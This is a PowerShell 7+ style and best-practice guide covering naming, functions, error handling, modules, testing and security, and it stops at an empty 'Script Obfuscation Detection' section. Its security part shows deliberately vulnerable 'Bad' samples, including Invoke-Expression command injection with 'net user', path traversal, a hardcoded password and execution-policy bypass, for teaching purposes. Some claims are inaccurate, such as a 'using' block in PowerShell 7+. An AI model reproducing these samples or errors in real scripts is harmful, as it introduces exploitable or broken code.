---
title: "PowerShell Style Guide"
description: "Cross-platform PowerShell 7+ scripting standards for automation and infrastructure management"
author: "Tyler Dukes"
tags: [powershell, scripting, cross-platform, automation, windows, infrastructure]
category: "Language Guides"
status: "active"
---

## Language Overview

**PowerShell** is a cross-platform task automation solution consisting of a command-line shell, scripting
language, and configuration management framework. This guide focuses on PowerShell 7+ (PowerShell Core) for
cross-platform compatibility.

### Key Characteristics

- **Paradigm**: Object-oriented, pipeline-based scripting
- **Case Sensitivity**: Case-insensitive by default
- **File Extensions**: `.ps1` (scripts), `.psm1` (modules), `.psd1` (manifests)
- **Primary Use**: System administration, automation, CI/CD, infrastructure management
- **Platforms**: Windows, Linux, macOS

### Supported Versions

- **PowerShell 7.2+**: Long-term support (LTS) versions
- **PowerShell 7.4+**: Current stable version

---

## Quick Reference

| **Category** | **Convention** | **Example** | **Notes** |
|-------------|----------------|-------------|-----------|
| **Naming** | | | |
| Functions | `Verb-Noun` PascalCase | `Get-UserData`, `Set-Configuration` | Use approved verbs |
| Variables | `$PascalCase` | `$UserName`, `$ApiUrl` | Descriptive names |
| Parameters | `PascalCase` | `[string]$FilePath` | No `$` in declaration |
| Constants | `$UPPER_CASE` | `$MAX_RETRIES` | Uppercase for clarity |
| Private Functions | `Verb-Noun` | Same as public | No special prefix needed |
| **Files** | | | |
| Scripts | `Verb-Noun.ps1` | `Deploy-Application.ps1` | PascalCase with `.ps1` |
| Modules | `ModuleName.psm1` | `MyUtilities.psm1` | PascalCase with `.psm1` |
| Manifests | `ModuleName.psd1` | `MyUtilities.psd1` | Module metadata |
| **Formatting** | | | |
| Indentation | 4 spaces | `if ($condition) {` | 4 spaces per level |
| Line Length | 115 characters | `# Reasonable max` | Keep lines readable |
| Braces | Same line opening | `if ($x) {` | K&R style |
| **Syntax** | | | |
| Comparison | `-eq`, `-ne`, `-lt`, `-gt` | `if ($x -eq 5)` | Not `==`, `!=` |
| String Quotes | Single `'` or double `"` | `'static'`, `"$variable"` | Double for interpolation |
| Comments | `#` for line, `<# #>` for block | `# Comment` | Hash for comments |
| **Parameters** | | | |
| Type | Always specify | `[string]$Path` | Strong typing |
| Validation | Use attributes | `[ValidateNotNullOrEmpty()]` | Built-in validation |
| Mandatory | Mark required | `[Parameter(Mandatory=$true)]` | Required parameters |
| **Best Practices** | | | |
| Error Handling | Use try/catch | `try { } catch { }` | Structured error handling |
| Cmdlet Binding | Use `[CmdletBinding()]` | Advanced functions | Enable advanced features |
| Pipeline | Support pipeline | `[Parameter(ValueFromPipeline)]` | Accept pipeline input |
| Write Output | Use `Write-Output` | Not `Write-Host` | Proper output stream |

---

## Naming Conventions

### Functions and Cmdlets

Use **PascalCase** with **Verb-Noun** pattern using approved verbs:

```powershell
## Good - Approved verb + PascalCase noun
function Get-UserProfile { }
function Set-ServiceConfiguration { }
function New-DeploymentPackage { }
function Remove-TemporaryFiles { }

## Bad - Unapproved verb or incorrect casing
function Fetch-UserProfile { }      # Use Get, not Fetch
function get-userProfile { }        # Incorrect casing
function Delete-TempFiles { }       # Use Remove, not Delete
```

### Approved Verbs

Use `Get-Verb` to see all approved verbs. Common categories:

```powershell
## Data Operations
Get, Set, New, Remove, Clear, Add, Copy, Move

## Lifecycle
Start, Stop, Restart, Enable, Disable, Initialize, Complete

## Diagnostics
Debug, Trace, Measure, Test, Watch, Confirm

## Communication
Send, Receive, Read, Write, Invoke, Connect, Disconnect
```

### Variables

Use **PascalCase** for variables:

```powershell
## Good
$UserName = "john.doe"
$ServiceEndpoint = "https://api.example.com"
$MaxRetryCount = 3

## Bad - Incorrect casing
$username = "john.doe"
$service_endpoint = "https://api.example.com"
```

### Constants and Configuration

Use **UPPER_SNAKE_CASE** for constants:

```powershell
## Good
$MAX_TIMEOUT_SECONDS = 300
$DEFAULT_API_VERSION = "v1"
$LOG_FILE_PATH = "/var/log/app.log"
```

---

## Function Structure

### Basic Function

```powershell
function Get-UserProfile {
    <#
    .SYNOPSIS
    Retrieves user profile information from Active Directory.

    .DESCRIPTION
    Queries Active Directory for detailed user profile information including
    display name, email, department, and manager.

    .PARAMETER UserName
    The SAM account name of the user to query.

    .PARAMETER IncludeManager
    Include manager information in the output.

    .EXAMPLE
    Get-UserProfile -UserName "jdoe"

    .EXAMPLE
    Get-UserProfile -UserName "jdoe" -IncludeManager

    .OUTPUTS
    PSCustomObject with user profile properties.

    .NOTES
    Requires Active Directory PowerShell module.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [string]$UserName,

        [Parameter(Mandatory = $false)]
        [switch]$IncludeManager
    )

    begin {
        Write-Verbose "Starting user profile retrieval for: $UserName"
    }

    process {
        try {
            $User = Get-ADUser -Identity $UserName -Properties DisplayName, EmailAddress, Department, Manager

            $Profile = [PSCustomObject]@{
                UserName    = $User.SamAccountName
                DisplayName = $User.DisplayName
                Email       = $User.EmailAddress
                Department  = $User.Department
            }

            if ($IncludeManager -and $User.Manager) {
                $Manager = Get-ADUser -Identity $User.Manager -Properties DisplayName
                $Profile | Add-Member -MemberType NoteProperty -Name Manager -Value $Manager.DisplayName
            }

            return $Profile
        }
        catch {
            Write-Error "Failed to retrieve user profile for '$UserName': $_"
            throw
        }
    }

    end {
        Write-Verbose "User profile retrieval completed"
    }
}
```

### Advanced Function with Pipeline Support

```powershell
function Set-ServiceConfiguration {
    [CmdletBinding(SupportsShouldProcess = $true, ConfirmImpact = 'Medium')]
    param(
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
        [string[]]$ServiceName,

        [Parameter(Mandatory = $true)]
        [ValidateSet('Running', 'Stopped', 'Paused')]
        [string]$DesiredState,

        [Parameter(Mandatory = $false)]
        [ValidateSet('Automatic', 'Manual', 'Disabled')]
        [string]$StartupType
    )

    begin {
        Write-Verbose "Configuring services with desired state: $DesiredState"
        $Results = @()
    }

    process {
        foreach ($Service in $ServiceName) {
            if ($PSCmdlet.ShouldProcess($Service, "Set configuration")) {
                try {
                    $ServiceObj = Get-Service -Name $Service -ErrorAction Stop

                    # Set startup type if specified
                    if ($PSBoundParameters.ContainsKey('StartupType')) {
                        Set-Service -Name $Service -StartupType $StartupType
                        Write-Verbose "Set startup type to '$StartupType' for service: $Service"
                    }

                    # Set desired state
                    switch ($DesiredState) {
                        'Running' { Start-Service -Name $Service }
                        'Stopped' { Stop-Service -Name $Service }
                        'Paused'  { Suspend-Service -Name $Service }
                    }

                    $Results += [PSCustomObject]@{
                        ServiceName = $Service
                        Status      = (Get-Service -Name $Service).Status
                        StartupType = (Get-Service -Name $Service).StartType
                        Success     = $true
                    }
                }
                catch {
                    Write-Error "Failed to configure service '$Service': $_"
                    $Results += [PSCustomObject]@{
                        ServiceName = $Service
                        Status      = $null
                        StartupType = $null
                        Success     = $false
                    }
                }
            }
        }
    }

    end {
        return $Results
    }
}
```

---

## Parameters and Validation

### Parameter Attributes

```powershell
function New-UserAccount {
    [CmdletBinding()]
    param(
        # Mandatory parameter with validation
        [Parameter(Mandatory = $true, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [ValidateLength(3, 20)]
        [string]$UserName,

        # Email validation
        [Parameter(Mandatory = $true)]
        [ValidatePattern('^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$')]
        [string]$Email,

        # Range validation
        [Parameter(Mandatory = $false)]
        [ValidateRange(1, 120)]
        [int]$Age = 18,

        # Set validation
        [Parameter(Mandatory = $false)]
        [ValidateSet('Admin', 'User', 'Guest')]
        [string]$Role = 'User',

        # Script validation
        [Parameter(Mandatory = $false)]
        [ValidateScript({ Test-Path $_ -PathType Container })]
        [string]$HomeDirectory,

        # Count validation
        [Parameter(Mandatory = $false)]
        [ValidateCount(1, 5)]
        [string[]]$Groups
    )

    # Function implementation
}
```

### Parameter Sets

```powershell
function Get-LogData {
    [CmdletBinding(DefaultParameterSetName = 'ByDate')]
    param(
        # ByDate parameter set
        [Parameter(Mandatory = $true, ParameterSetName = 'ByDate')]
        [datetime]$StartDate,

        [Parameter(Mandatory = $true, ParameterSetName = 'ByDate')]
        [datetime]$EndDate,

        # ByCount parameter set
        [Parameter(Mandatory = $true, ParameterSetName = 'ByCount')]
        [ValidateRange(1, 1000)]
        [int]$Count,

        # Common parameter across all sets
        [Parameter(Mandatory = $false)]
        [string]$LogLevel = 'Info'
    )

    switch ($PSCmdlet.ParameterSetName) {
        'ByDate' {
            Get-WinEvent -FilterHashtable @{
                LogName   = 'Application'
                StartTime = $StartDate
                EndTime   = $EndDate
            } | Where-Object { $_.LevelDisplayName -eq $LogLevel }
        }
        'ByCount' {
            Get-WinEvent -LogName 'Application' -MaxEvents $Count |
                Where-Object { $_.LevelDisplayName -eq $LogLevel }
        }
    }
}
```

---

## Error Handling

### Try-Catch-Finally

```powershell
function Invoke-ApiRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Endpoint,

        [Parameter(Mandatory = $false)]
        [int]$MaxRetries = 3
    )

    $AttemptCount = 0
    $Success = $false

    while (-not $Success -and $AttemptCount -lt $MaxRetries) {
        $AttemptCount++
        Write-Verbose "API request attempt $AttemptCount of $MaxRetries"

        try {
            $Response = Invoke-RestMethod -Uri $Endpoint -Method Get -ErrorAction Stop
            $Success = $true
            return $Response
        }
        catch [System.Net.WebException] {
            Write-Warning "Network error on attempt $AttemptCount: $($_.Exception.Message)"
            if ($AttemptCount -eq $MaxRetries) {
                Write-Error "Max retries reached. Request failed."
                throw
            }
            Start-Sleep -Seconds (2 * $AttemptCount)
        }
        catch {
            Write-Error "Unexpected error: $($_.Exception.Message)"
            throw
        }
        finally {
            Write-Verbose "Completed attempt $AttemptCount"
        }
    }
}
```

### ErrorAction and ErrorVariable

```powershell
## Suppress errors for specific commands
$Service = Get-Service -Name 'NonExistentService' -ErrorAction SilentlyContinue

if ($null -eq $Service) {
    Write-Warning "Service not found, creating..."
}

## Capture errors for analysis
Get-Process -Name 'chrome' -ErrorAction SilentlyContinue -ErrorVariable ProcessErrors
if ($ProcessErrors) {
    Write-Error "Failed to get process: $($ProcessErrors[0].Exception.Message)"
}
```

---

## Pipeline Usage

### Pipeline-Aware Functions

```powershell
function Export-UserData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [PSCustomObject[]]$User,

        [Parameter(Mandatory = $true)]
        [string]$OutputPath
    )

    begin {
        Write-Verbose "Starting user data export to: $OutputPath"
        $AllUsers = @()
    }

    process {
        $AllUsers += $User
    }

    end {
        $AllUsers | Export-Csv -Path $OutputPath -NoTypeInformation
        Write-Verbose "Exported $($AllUsers.Count) users to $OutputPath"
    }
}

## Usage
Get-ADUser -Filter * | Export-UserData -OutputPath 'users.csv'
```

### Pipeline Best Practices

```powershell
## Good - Efficient pipeline usage
Get-Process | Where-Object { $_.WorkingSet -gt 100MB } | Sort-Object WorkingSet -Descending | Select-Object -First 10

## Good - Named parameters for clarity
Get-ChildItem -Path C:\Logs -Filter *.log |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) } |
    Remove-Item -Force

## Avoid - Unnecessary loops when pipeline works
## Bad
$Files = Get-ChildItem -Path C:\Logs
foreach ($File in $Files) {
    Remove-Item -Path $File.FullName
}

## Good
Get-ChildItem -Path C:\Logs | Remove-Item
```

---

## Module Structure

### Module Layout

```text
MyModule/
├── MyModule.psd1          # Module manifest
├── MyModule.psm1          # Root module script
├── Public/                # Exported functions
│   ├── Get-MyData.ps1
│   └── Set-MyData.ps1
├── Private/               # Internal functions
│   └── ConvertTo-MyFormat.ps1
├── Classes/               # PowerShell classes
│   └── MyClass.ps1
├── Tests/                 # Pester tests
│   ├── MyModule.Tests.ps1
│   └── Integration.Tests.ps1
└── en-US/                 # Help files
    └── MyModule-help.xml
```

### Module Manifest (.psd1)

```powershell
@{
    RootModule        = 'MyModule.psm1'
    ModuleVersion     = '1.0.0'
    GUID              = '12345678-1234-1234-1234-123456789012'
    Author            = 'Tyler Dukes'
    CompanyName       = 'Dukes Engineering'
    Copyright         = '(c) 2025 Tyler Dukes. All rights reserved.'
    Description       = 'Module for managing application deployments'
    PowerShellVersion = '7.2'

    FunctionsToExport = @('Get-MyData', 'Set-MyData')
    CmdletsToExport   = @()
    VariablesToExport = @()
    AliasesToExport   = @()

    RequiredModules   = @('Microsoft.PowerShell.Management')

    PrivateData = @{
        PSData = @{
            Tags       = @('Automation', 'Deployment')
            LicenseUri = 'https://github.com/myorg/MyModule/blob/main/LICENSE'
            ProjectUri = 'https://github.com/myorg/MyModule'
        }
    }
}
```

### Root Module (.psm1)

```powershell
## MyModule.psm1

## Import all public functions
$PublicFunctions = @(Get-ChildItem -Path $PSScriptRoot\Public\*.ps1 -ErrorAction SilentlyContinue)
foreach ($Function in $PublicFunctions) {
    try {
        . $Function.FullName
    }
    catch {
        Write-Error "Failed to import function $($Function.FullName): $_"
    }
}

## Import all private functions
$PrivateFunctions = @(Get-ChildItem -Path $PSScriptRoot\Private\*.ps1 -ErrorAction SilentlyContinue)
foreach ($Function in $PrivateFunctions) {
    try {
        . $Function.FullName
    }
    catch {
        Write-Error "Failed to import private function $($Function.FullName): $_"
    }
}

## Export only public functions
Export-ModuleMember -Function $PublicFunctions.BaseName
```

---

## Testing with Pester

### Basic Pester Test

```powershell
## Get-UserProfile.Tests.ps1
BeforeAll {
    . $PSScriptRoot/../Public/Get-UserProfile.ps1
}

Describe 'Get-UserProfile' {
    Context 'Parameter validation' {
        It 'Should require UserName parameter' {
            { Get-UserProfile } | Should -Throw
        }

        It 'Should accept valid UserName' {
            { Get-UserProfile -UserName 'jdoe' } | Should -Not -Throw
        }
    }

    Context 'User retrieval' {
        BeforeEach {
            Mock Get-ADUser {
                return [PSCustomObject]@{
                    SamAccountName = 'jdoe'
                    DisplayName    = 'John Doe'
                    EmailAddress   = 'jdoe@example.com'
                    Department     = 'IT'
                }
            }
        }

        It 'Should return user profile object' {
            $Result = Get-UserProfile -UserName 'jdoe'
            $Result | Should -Not -BeNullOrEmpty
            $Result.UserName | Should -Be 'jdoe'
        }

        It 'Should include email address' {
            $Result = Get-UserProfile -UserName 'jdoe'
            $Result.Email | Should -Match '^\w+@\w+\.\w+$'
        }
    }
}
```

---

## PSScriptAnalyzer Configuration

### .pslintrc.psd1

```powershell
@{
    Rules = @{
        PSAvoidUsingCmdletAliases = @{
            Enable = $true
        }
        PSAvoidUsingWriteHost = @{
            Enable = $true
        }
        PSUseApprovedVerbs = @{
            Enable = $true
        }
        PSUseDeclaredVarsMoreThanAssignments = @{
            Enable = $true
        }
        PSProvideCommentHelp = @{
            Enable = $true
        }
    }
    ExcludeRules = @(
        'PSAvoidUsingInvokeExpression'
    )
    Severity = @('Error', 'Warning')
}
```

### Running PSScriptAnalyzer

```powershell
## Analyze single file
Invoke-ScriptAnalyzer -Path .\MyScript.ps1

## Analyze entire directory
Invoke-ScriptAnalyzer -Path .\MyModule -Recurse

## With custom settings
Invoke-ScriptAnalyzer -Path .\MyModule -Settings .\.pslintrc.psd1
```

---

## Common Pitfalls

### Array vs ArrayList Performance

**Issue**: Using `+=` to build arrays creates a new array each time, causing O(n²) performance.

**Example**:

```powershell
## Bad - Slow array building
$results = @()
foreach ($i in 1..10000) {
    $results += $i  # ❌ Creates new array each iteration! Very slow
}
```

**Solution**: Use ArrayList or collect pipeline output.

```powershell
## Good - ArrayList for dynamic growth
$results = [System.Collections.ArrayList]::new()
foreach ($i in 1..10000) {
    [void]$results.Add($i)  # ✅ Fast O(1) append
}

## Good - Collect from pipeline
$results = foreach ($i in 1..10000) {
    $i  # ✅ Output collected into array automatically
}

## Good - List generic type
$results = [System.Collections.Generic.List[int]]::new()
$results.Add(42)
```

**Key Points**:

- `+=` on arrays copies entire array each time
- Use ArrayList or Generic List for dynamic collections
- Pipeline output collection is efficient
- Use `[void]` to suppress ArrayList.Add() return value

### $null Comparison Order

**Issue**: Comparing with `$null` on right side can give unexpected results with arrays.

**Example**:

```powershell
## Bad - $null on right
$array = @(1, 2, $null, 3)
if ($array -eq $null) {  # ❌ Always false! Returns elements equal to $null
    Write-Host "Array is null"  # Never executes
}
```

**Solution**: Always put `$null` on the left side of comparisons.

```powershell
## Good - $null on left
$array = @(1, 2, $null, 3)
if ($null -eq $array) {  # ✅ Correct null check
    Write-Host "Array is null"
}

## Good - Check for empty or null
if ($null -eq $array -or $array.Count -eq 0) {
    Write-Host "Array is null or empty"
}
```

**Key Points**:

- Always use `$null -eq $variable`, not `$variable -eq $null`
- With `$null` on right, `-eq` filters array for null values
- With `$null` on left, `-eq` performs proper null check
- This applies to all comparison operators

### Variable Scope Confusion

**Issue**: Missing `$script:` or `$global:` prefix causes variables to be local-scoped only.

**Example**:

```powershell
## Bad - Variable not accessible outside function
function Set-Config {
    $config = "production"  # ❌ Local scope only
}

Set-Config
Write-Host $config  # Empty! Variable doesn't exist here
```

**Solution**: Use scope modifiers for non-local variables.

```powershell
## Good - Script scope
function Set-Config {
    $script:config = "production"  # ✅ Accessible in script
}

Set-Config
Write-Host $script:config  # "production"

## Good - Global scope (use sparingly)
function Set-GlobalConfig {
    $global:config = "production"  # ✅ Accessible everywhere
}

## Good - Return values instead
function Get-Config {
    $config = "production"
    return $config  # ✅ Better approach
}

$config = Get-Config
```

**Key Points**:

- Variables default to local scope in functions
- `$script:` for script-wide variables
- `$global:` for truly global variables (use rarely)
- Prefer return values over scope manipulation

### Pipeline vs ForEach Performance

**Issue**: Using `ForEach-Object` in pipeline is slower than `foreach` loop for in-memory collections.

**Example**:

```powershell
## Bad - Slow pipeline for in-memory collection
$users = Get-Content users.txt
$users | ForEach-Object {  # ❌ Slower for arrays in memory
    Process-User $_
}
```

**Solution**: Use `foreach` loop for in-memory collections.

```powershell
## Good - Fast foreach loop
$users = Get-Content users.txt
foreach ($user in $users) {  # ✅ Faster for in-memory arrays
    Process-User $user
}

## Good - Pipeline for streaming
Get-ChildItem -Recurse | ForEach-Object {  # ✅ Good for streaming
    Process-File $_
}

## Good - Where-Object vs .Where() method
$large = $users.Where({ $_.Size -gt 1MB })  # ✅ Faster method syntax
```

**Key Points**:

- `foreach` loop is faster for arrays already in memory
- Pipeline (`ForEach-Object`) good for streaming large datasets
- Use `.Where()` and `.ForEach()` methods for better performance
- Pipeline allows memory-efficient processing of large data

### Try-Catch Without Finally

**Issue**: Not using `finally` block causes cleanup code to be skipped on errors.

**Example**:

```powershell
## Bad - Resources not cleaned up on error
try {
    $file = [System.IO.File]::Open("data.txt", "Open")
    Process-File $file
    $file.Close()  # ❌ Not called if Process-File throws!
} catch {
    Write-Error $_.Exception.Message
}
```

**Solution**: Use `finally` for cleanup code.

```powershell
## Good - Finally ensures cleanup
try {
    $file = [System.IO.File]::Open("data.txt", "Open")
    Process-File $file
} catch {
    Write-Error $_.Exception.Message
} finally {
    if ($null -ne $file) {
        $file.Close()  # ✅ Always called
    }
}

## Better - Using statement (PowerShell 7+)
using ($file = [System.IO.File]::Open("data.txt", "Open")) {
    Process-File $file
}  # ✅ Automatically disposed

## Better - Cmdlet with built-in cleanup
Get-Content "data.txt" | Process-Data  # ✅ Handles file closing
```

**Key Points**:

- `finally` always executes, even on errors or returns
- Use `finally` for resource cleanup (files, connections, locks)
- PowerShell 7+ supports `using` statement
- Prefer cmdlets that handle cleanup automatically

---

## Anti-Patterns

### ❌ Avoid: Using Aliases in Scripts

```powershell
## Bad - Aliases reduce readability
gci | ? { $_.Length -gt 1MB } | % { ri $_ }

## Good - Full cmdlet names
Get-ChildItem | Where-Object { $_.Length -gt 1MB } | ForEach-Object { Remove-Item $_ }
```

### ❌ Avoid: Write-Host for Output

```powershell
## Bad - Write-Host cannot be captured
function Get-ComputerStatus {
    Write-Host "Computer is online"
}

## Good - Use Write-Output or return
function Get-ComputerStatus {
    return [PSCustomObject]@{
        Status = 'Online'
    }
}
```

### ❌ Avoid: Unapproved Verbs

```powershell
## Bad - Unapproved verbs
function Fetch-UserData { }
function Delete-OldFiles { }

## Good - Approved verbs
function Get-UserData { }
function Remove-OldFiles { }
```

### ❌ Avoid: Not Using Parameter Validation

```powershell
## Bad - No validation
function Set-UserAge {
    param($Age)
    # No validation - can accept invalid values
    $User.Age = $Age
}

## Good - With validation
function Set-UserAge {
    param(
        [Parameter(Mandatory=$true)]
        [ValidateRange(0, 150)]
        [int]$Age
    )
    $User.Age = $Age
}
```

### ❌ Avoid: Using Positional Parameters in Scripts

```powershell
## Bad - Positional parameters are unclear
Get-ChildItem C:\Temp *.txt $true

## Good - Named parameters
Get-ChildItem -Path C:\Temp -Filter *.txt -Recurse
```

### ❌ Avoid: Suppressing Errors with Out-Null

```powershell
## Bad - Hiding errors
Remove-Item $file -ErrorAction SilentlyContinue 2>&1 | Out-Null

## Good - Explicit error handling
try {
    Remove-Item $file -ErrorAction Stop
} catch {
    Write-Warning "Failed to remove $file: $_"
}
```

### ❌ Avoid: Not Using Splatting for Many Parameters

```powershell
## Bad - Long parameter list
New-ADUser -Name "John Doe" -SamAccountName "jdoe" `
  -UserPrincipalName "jdoe@contoso.com" `
  -Path "OU=Users,DC=contoso,DC=com" -AccountPassword $password -Enabled $true

## Good - Use splatting
$userParams = @{
    Name              = "John Doe"
    SamAccountName    = "jdoe"
    UserPrincipalName = "jdoe@contoso.com"
    Path              = "OU=Users,DC=contoso,DC=com"
    AccountPassword   = $password
    Enabled           = $true
}
New-ADUser @userParams
```

---

## Security Best Practices

### Execution Policy and Script Signing

Use proper execution policies and sign scripts:

```powershell
## Bad - Bypassing execution policy
PowerShell.exe -ExecutionPolicy Bypass -File script.ps1  # ❌ Security risk!

## Good - Use RemoteSigned or AllSigned
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

## Good - Sign scripts
$cert = Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert
Set-AuthenticodeSignature -FilePath .\script.ps1 -Certificate $cert

## Good - Verify signature before execution
$signature = Get-AuthenticodeSignature -FilePath .\script.ps1
if ($signature.Status -ne 'Valid') {
    throw "Script signature is invalid!"
}
```

**Key Points**:

- Never use `-ExecutionPolicy Bypass` in production
- Sign all production scripts
- Use `AllSigned` policy for maximum security
- Verify signatures before execution
- Store code signing certificates securely
- Use timestamp servers when signing

### Secure Credential Management

Never hardcode credentials:

```powershell
## Bad - Hardcoded credentials
$username = "admin"
$password = "Password123"  # ❌ Exposed!
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)

## Good - Use Get-Credential
$credential = Get-Credential -UserName "admin" -Message "Enter password"

## Good - Use Secret Management module
Install-Module -Name Microsoft.PowerShell.SecretManagement
Install-Module -Name SecretManagement.Keychain  # macOS
# Or: SecretManagement.KeePass, SecretManagement.LastPass

Set-Secret -Name "ServiceAccount" -Secret (Get-Credential)
$credential = Get-Secret -Name "ServiceAccount" -AsPlainText

## Good - Azure Key Vault
$secret = Get-AzKeyVaultSecret -VaultName "MyVault" -Name "DbPassword"
$credential = New-Object PSCredential("admin", $secret.SecretValue)

## Good - Never log credentials
function Connect-Database {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [PSCredential]$Credential
    )
    # Credential automatically masked in verbose output
    Write-Verbose "Connecting as $($Credential.UserName)"  # ✅ Password not logged
}
```

**Key Points**:

- Never hardcode passwords in scripts
- Use `PSCredential` objects
- Use Secret Management modules
- Leverage cloud secret stores (Azure Key Vault, AWS Secrets Manager)
- Never log or display `SecureString` values
- Rotate credentials regularly

### Input Validation and Injection Prevention

Validate all inputs to prevent injection attacks:

```powershell
## Bad - No validation (injection risk)
param($Username)
Invoke-Expression "net user $Username /delete"  # ❌ Command injection!

## Good - Validate inputs
param(
    [Parameter(Mandatory)]
    [ValidatePattern('^[a-zA-Z0-9_-]+$')]
    [ValidateLength(1, 20)]
    [string]$Username
)
Remove-LocalUser -Name $Username  # ✅ Safe cmdlet

## Good - Use parameter validation
function Remove-UserAccount {
    param(
        [Parameter(Mandatory)]
        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment,

        [Parameter(Mandatory)]
        [ValidateScript({
            if ($_ -match '^[a-zA-Z0-9_-]+$') { $true }
            else { throw "Invalid username format" }
        })]
        [string]$Username
    )

    Remove-LocalUser -Name $Username
}

## Good - Avoid Invoke-Expression
## Bad
$command = "Get-Process -Name $processName"  # User input
Invoke-Expression $command  # ❌ Code injection!

## Good
Get-Process -Name $processName  # ✅ Direct cmdlet call
```

**Key Points**:

- Always validate user inputs
- Use `ValidatePattern`, `ValidateSet`, `ValidateScript`
- Never use `Invoke-Expression` with user input
- Use cmdlets instead of string commands
- Sanitize inputs before file operations
- Use parameter binding, not string concatenation

### Secure File Operations

Prevent path traversal and unauthorized file access:

```powershell
## Bad - Path traversal vulnerability
param($FileName)
$content = Get-Content "C:\Data\$FileName"  # ❌ Can access ../../../Windows/System32

## Good - Validate and resolve paths
param(
    [Parameter(Mandatory)]
    [ValidateScript({
        if ($_ -notmatch '\.\./') { $true }
        else { throw "Path traversal detected" }
    })]
    [string]$FileName
)

$basePath = "C:\Data"
$fullPath = Join-Path $basePath $FileName | Resolve-Path
if (-not $fullPath.Path.StartsWith($basePath)) {
    throw "Access denied: path outside allowed directory"
}
$content = Get-Content $fullPath

## Good - Set restrictive file permissions
$acl = Get-Acl "C:\Secrets\config.json"
$acl.SetAccessRuleProtection($true, $false)  # Disable inheritance
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "BUILTIN\Administrators", "FullControl", "Allow"
)
$acl.AddAccessRule($rule)
Set-Acl "C:\Secrets\config.json" $acl

## Good - Verify checksums
function Get-FileIfValid {
    param(
        [string]$Url,
        [string]$ExpectedHash
    )

    $tempFile = New-TemporaryFile
    Invoke-WebRequest -Uri $Url -OutFile $tempFile

    $actualHash = (Get-FileHash $tempFile -Algorithm SHA256).Hash
    if ($actualHash -ne $ExpectedHash) {
        Remove-Item $tempFile
        throw "Hash mismatch! File may be tampered."
    }

    return $tempFile
}
```

**Key Points**:

- Validate file paths to prevent traversal
- Use `Resolve-Path` and verify resolved paths
- Set appropriate ACLs on sensitive files
- Verify file hashes after download
- Never trust user-provided paths
- Use temporary files for downloads

### Least Privilege Execution

Run scripts with minimal required privileges:

```powershell
## Bad - Requiring admin for everything
#Requires -RunAsAdministrator
# Entire script runs as admin even if not needed

## Good - Check and request elevation only when needed
function Install-Application {
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator
    )) {
        throw "This function requires administrator privileges"
    }

    # Admin-only operations here
}

## Good - Use RunAs for specific commands
$credential = Get-Credential
Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {
    Install-WindowsFeature -Name Web-Server
}

## Good - Separate privileged and non-privileged operations
function Deploy-Application {
    # Non-privileged operations
    Test-Configuration
    Build-Application

    # Only elevate for installation
    if (Test-IsAdmin) {
        Install-Service
    } else {
        Write-Warning "Run as administrator to install service"
    }
}
```

**Key Points**:

- Don't require admin unless absolutely necessary
- Check for admin rights before privileged operations
- Use `Invoke-Command` with credentials for remote operations
- Separate privileged and non-privileged code
- Document why elevation is needed
- Use service accounts with minimal permissions

### Network Security

Secure network operations:

```powershell
## Bad - Insecure HTTP
Invoke-WebRequest -Uri "http://api.example.com/data"  # ❌ Unencrypted!

## Good - Use HTTPS
Invoke-WebRequest -Uri "https://api.example.com/data"

## Good - Verify SSL certificates
try {
    Invoke-WebRequest -Uri "https://api.example.com/data" `
        -ErrorAction Stop  # Will fail on invalid certs
} catch {
    Write-Error "SSL certificate validation failed: $_"
}

## Good - Use authentication headers securely
$token = Get-Secret -Name "ApiToken" -AsPlainText
$headers = @{
    "Authorization" = "Bearer $token"
}
Invoke-RestMethod -Uri "https://api.example.com/data" -Headers $headers

## Good - Limit TLS versions
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor `
    [Net.SecurityProtocolType]::Tls13
```

**Key Points**:

- Always use HTTPS for network requests
- Verify SSL/TLS certificates
- Use TLS 1.2 or higher
- Never disable certificate validation
- Use secure authentication (OAuth, API keys from vaults)
- Implement request timeouts

### Audit Logging

Log security-relevant operations:

```powershell
## Good - Comprehensive logging
function Remove-UserAccount {
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory)]
        [string]$Username
    )

    $auditLog = "C:\Logs\audit.log"
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $user = $env:USERNAME
    $computer = $env:COMPUTERNAME

    $logEntry = "$timestamp | $computer | $user | Attempting to remove user: $Username"
    Add-Content -Path $auditLog -Value $logEntry

    try {
        if ($PSCmdlet.ShouldProcess($Username, "Remove user account")) {
            Remove-LocalUser -Name $Username -ErrorAction Stop
            $logEntry = "$timestamp | $computer | $user | SUCCESS: Removed user: $Username"
            Add-Content -Path $auditLog -Value $logEntry
        }
    } catch {
        $logEntry = "$timestamp | $computer | $user | FAILED: $($_.Exception.Message)"
        Add-Content -Path $auditLog -Value $logEntry
        throw
    }
}

## Good - Use Windows Event Log
function Write-SecurityEvent {
    param(
        [string]$Message,
        [ValidateSet('Information', 'Warning', 'Error')]
        [string]$Level = 'Information'
    )

    Write-EventLog -LogName Application `
        -Source "MyApplication" `
        -EntryType $Level `
        -EventId 1000 `
        -Message $Message
}
```

**Key Points**:

- Log all security-relevant operations
- Include timestamps, user, and computer
- Log both successes and failures
- Use Windows Event Log for system-level events
- Protect log files with appropriate ACLs
- Implement log rotation
- Monitor logs for suspicious activity

### Script Obfuscation Detection

Avoid and detect obfuscated scripts:

```powershell
